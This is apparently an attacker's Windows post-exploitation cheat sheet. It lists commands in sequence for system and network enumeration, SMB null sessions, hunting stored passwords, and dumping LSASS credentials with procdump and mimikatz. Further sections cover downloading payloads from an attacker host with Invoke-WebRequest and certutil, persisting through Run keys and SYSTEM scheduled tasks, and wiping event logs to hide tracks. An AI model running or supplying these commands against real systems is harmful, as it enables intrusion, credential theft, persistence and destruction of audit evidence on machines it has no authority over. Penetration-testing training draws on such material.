
1. Basic System Enumeration
- Show system info: systeminfo
- List local users: net user
- List groups: net localgroup
- List members of a group: net localgroup Administrators
- Show current user: whoami
- Show user privileges: whoami /priv
- Show environment variables: set
- Check running processes: tasklist
- List installed programs: wmic product get name
___

2. Network Information
- IP configuration: ipconfig /all
- List active connections: netstat -ano
- Firewall config: netsh advfirewall show allprofiles
- View ARP table: arp -a
- Check routing table: route print
___

3. Share &amp; SMB Enumeration
- View shared folders: net share
- Enumerate remote shares: net view \\[IP]
- List sessions: net session
- View open files: net file
- Show NetBIOS names: nbtstat -A [IP]
- Use null session (if allowed): net use \\[IP]\ipc$ &quot;&quot; /user:&quot;&quot;
___

4. User &amp; Credential Hunting
- Check for stored credentials: cmdkey /list
- Search for passwords: findstr /si password *.txt *.ini *.xml
- Search for creds in registry: reg query HKLM /f password /t REG_SZ /s
- Extract password hashes (LSASS): procdump -ma lsass.exe lsass.dmp + mimikatz
___

5. Privilege Escalation Checks
- Check privileges: whoami /priv
- Check service configs: sc qc [service]
- List all services: sc query
- Search for unquoted service paths: wmic service get name,pathname,startmode | findstr /i &quot;Auto&quot;
- Scheduled tasks: schtasks /query /fo LIST /v
___

6. PowerShell Recon &amp; Abuse
- List installed hotfixes: Get-HotFix
- Check Windows Defender status: Get-MpPreference
- Download a payload: Invoke-WebRequest -Uri http://attacker/payload.exe -OutFile payload.exe
- Bypass execution policy: powershell -ExecutionPolicy Bypass -File script.ps1
___

7. Persistence Techniques
- Add a startup registry key: reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updater /t REG_SZ /d &quot;C:\malware.exe&quot;
- Create a new scheduled task: schtasks /create /tn &quot;MyTask&quot; /tr &quot;cmd.exe /c C:\backdoor.exe&quot; /sc onlogon /ru SYSTEM
___

8. Post-Exploitation Tools
- mimikatz: Credential dumping (sekurlsa::logonpasswords)
- powershell: Built-in scripting, privilege checks
- winPEAS.exe: PrivEsc enumeration
- AccessChk.exe: Permissions check on files/services
- SharpUp, Seatbelt: Offensive PowerShell recon tools
___

9. File Transfer (From Kali to Windows)
- Python HTTP server (on Kali): python3 -m http.server 80
- PowerShell download (on Win): Invoke-WebRequest http://[KALI_IP]/file.exe -OutFile file.exe
- Certutil (Win): certutil -urlcache -split -f http://[KALI_IP]/file.exe file.exe
___

10. Clearing Tracks
- Delete event logs: wevtutil cl System
- Delete specific file: del C:\Users\user\Desktop\payload.exe